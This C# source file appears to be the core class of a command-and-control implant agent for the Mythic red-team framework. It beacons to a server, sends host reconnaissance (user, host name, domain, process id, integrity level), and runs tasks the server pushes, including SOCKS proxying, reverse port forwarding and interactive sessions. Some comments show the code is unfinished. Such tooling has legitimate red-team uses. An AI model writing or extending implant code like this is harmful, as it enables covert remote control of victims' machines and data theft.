using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Diagnostics;
using System.Net;

namespace Agent
{
    public class Agent : IAgent
    {
        private IAgentConfig config { get; set; }
        private IEnumerable<IProfile> profiles { get; set; }
        private ILogger logger { get; set; }
        private ITaskManager taskManager { get; set; }
        private ITokenManager tokenManager { get; set; }
        private IProfile _profile = null;

        //Will need ISocksManager, IRpfwdManager, IForwarderManager
        public Agent(IEnumerable<IProfile> profiles, ITaskManager taskManager, ILogger logger, IAgentConfig config, ITokenManager tokenManager)
        {
            this.profiles = profiles;
            this.taskManager = taskManager;
            this.logger = logger;
            this.config = config;
            this.tokenManager = tokenManager;

            _profile = SelectProfile(99);
            _profile.SetTaskingReceived += OnTaskingReceived;
        }
        public async Task Start()
        {
            try
            {
                if (!this.CheckKillDate())
                {
                    logger.Log("killdate reached, exiting.");
                    Environment.Exit(0);
                }
                await this.CheckIn();
                logger.Log("Starting beacon.");
                await this._profile.StartBeacon();
                logger.Log("Beacon exited.");
            }
            catch(Exception e)
            {
                logger.Log("Beacon exited.");
                logger.Log(e.Message);
                logger.Log(e.StackTrace);
            }
        }
        private IProfile SelectProfile(int index)
        {
            if (index == 99) //Default Value
            {
                Random random = new Random();

                return profiles.ElementAt(random.Next(profiles.Count()));
            }

            return profiles.ElementAt(index);
        }

        /// <summary>
        /// Performa  check-in with the Mythic server
        /// </summary>
        public async Task<bool> CheckIn()
        {
            logger.Log("Starting checkin.");
            Checkin ct = new Checkin()
            {
                action = "checkin",
                //ips = Dns.GetHostEntry(Dns.GetHostName()).AddressList.Select(a => a.ToString()).ToArray(),
                ips = new string[] { "127.0.0.1" },
                os = Environment.OSVersion.ToString(),
                user = Environment.UserName,
                host = Dns.GetHostName(),
                pid = Process.GetCurrentProcess().Id,
                uuid = this.config.uuid,
                architecture = Misc.GetArch(),
                domain = Environment.UserDomainName,
                integrity_level = tokenManager.getIntegrity(),
            };

            try
            {
                CheckinResponse res = await _profile.Checkin(ct);

                if (res is null || res.status != "success")
                {
                    logger.Log("Checkin failed.");
                    logger.Log(res.status);
                    return false;
                }
                logger.Log("Checkin Succeed");

                this.updateAgentInfo(res);

                return true;

            }
            catch (Exception e)
            {
                return false;
            }
        }

        /// <summary>
        /// Update the agent information on successful checkin with the Mythic server
        /// </summary>
        /// <param name="res">CheckIn Response</param>
        private void updateAgentInfo(CheckinResponse res)
        {
            this.config.uuid = res.id;
        }

        private async void OnTaskingReceived(object sender, TaskingReceivedArgs args)
        {
            if(args.tasking_response is null)
            {
                return;
            }

            args.tasking_response.tasks.ForEach(task => this.taskManager.StartTaskAsync(new ServerJob(task)));

            if (args.tasking_response.socks is not null)
            {
                this.taskManager.HandleProxyResponses("socks", args.tasking_response.socks);
            }

            if (args.tasking_response.rpfwd is not null)
            {
                this.taskManager.HandleProxyResponses("rpwfd", args.tasking_response.rpfwd);
            }

            if (args.tasking_response.delegates is not null)
            {
                this.taskManager.HandleDelegateResponses(args.tasking_response.delegates);
            }

            if(args.tasking_response.responses is not null)
            {
                this.taskManager.HandleServerResponses(args.tasking_response.responses);
            }

            if(args.tasking_response.interactive is not null)
            {
                this.taskManager.HandleInteractiveResponses(args.tasking_response.interactive);
            }
        }
        //Is this correct?
        private bool CheckKillDate()
        {
            logger.Log($"is {this.config.killDate} greater than {DateTime.Now}?");


            return this.config.killDate > DateTime.Now;
        }
    }
}
